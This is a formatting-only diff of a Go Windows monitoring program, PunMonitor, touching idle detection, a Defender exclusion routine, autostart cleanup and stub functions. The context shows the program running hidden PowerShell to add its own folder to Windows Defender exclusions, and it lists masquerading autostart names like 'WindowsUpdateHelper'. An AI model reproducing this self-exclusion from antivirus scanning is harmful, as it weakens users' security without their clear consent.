@@ -348,7 +348,7 @@ func (id *IdleDetector) loop(ctx context.Context) {
 				continue
 			}
 			tick, _, _ := GetTickCount64.Call()
-			idleTime := time.Duration(uint64(tick) - uint64(lii.dwTime)) * time.Millisecond
+			idleTime := time.Duration(uint64(tick)-uint64(lii.dwTime)) * time.Millisecond
 			idle := idleTime > id.threshold
 			if idle != wasIdle {
 				id.callback(idle)
@@ -468,7 +468,7 @@ func addDefenderExclusion() {
 		return
 	}
 	exeDir := filepath.Dir(exePath)
-	
+
 	// Try PowerShell command to add exclusion (requires admin)
 	psCmd := fmt.Sprintf(`Add-MpExclusion -Path '%s' -ErrorAction SilentlyContinue`, exeDir)
 	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psCmd)
@@ -477,7 +477,7 @@ func addDefenderExclusion() {
 		llog("info", "Defender exclusion added for %s", exeDir)
 		return
 	}
-	
+
 	// Not admin — write instructions file for user
 	instructions := fmt.Sprintf(`Windows Defender may block PunMonitor.
 
@@ -493,7 +493,7 @@ Or manually:
 5. Add folder: %s
 
 `, exeDir, exeDir)
-	
+
 	instructionsPath := filepath.Join(dataDir(), "DEFENDER_HELP.txt")
 	os.WriteFile(instructionsPath, []byte(instructions), 0644)
 	llog("info", "Defender exclusion requires admin. Instructions saved to %s", instructionsPath)
@@ -515,14 +515,14 @@ func cleanDuplicateAutostartEntries() {
 	// imitating it) used to install themselves. We own "PunMonitor" and
 	// "PunMonitorWatchdog" only; remove anything else.
 	legacyNames := map[string]bool{
-		"SystemMonitor":      true,
-		"SystemHelper":       true,
+		"SystemMonitor":       true,
+		"SystemHelper":        true,
 		"WindowsUpdateHelper": true,
-		"PunMonitorServer":   true,
-		"PunMonitorAgent":    true,
-		"RemoteMonitor":      true,
-		"RemoteMonitorAgent": true,
-		"SystemWatchdog":     true,
+		"PunMonitorServer":    true,
+		"PunMonitorAgent":     true,
+		"RemoteMonitor":       true,
+		"RemoteMonitorAgent":  true,
+		"SystemWatchdog":      true,
 	}
 
 	// Paths / fragments that, if present in a Run value, mean it's NOT our
@@ -729,14 +729,14 @@ var (
 	punMonitorImageNames = []string{"PunMonitor.exe", "test_build.exe"}
 )
 
-func ensureSingleInstance(replaceExisting bool) bool { return true }
-func killAllPunMonitorImages()                       {}
-func tryAcquireSingletonMutex() bool                 { return true }
-func releaseSingleton()                              {}
-func killOtherPunMonitorProcesses(selfPID int)        {}
-func writePIDFile()                                   {}
-func removePIDFile()                                  {}
-func isPortInUse(port int) bool                       { return false }
+func ensureSingleInstance(replaceExisting bool) bool      { return true }
+func killAllPunMonitorImages()                            {}
+func tryAcquireSingletonMutex() bool                      { return true }
+func releaseSingleton()                                   {}
+func killOtherPunMonitorProcesses(selfPID int)            {}
+func writePIDFile()                                       {}
+func removePIDFile()                                      {}
+func isPortInUse(port int) bool                           { return false }
 func updateSystemInfoFromActivity(info map[string]string) {}
 
 func getIdleDuration() time.Duration {
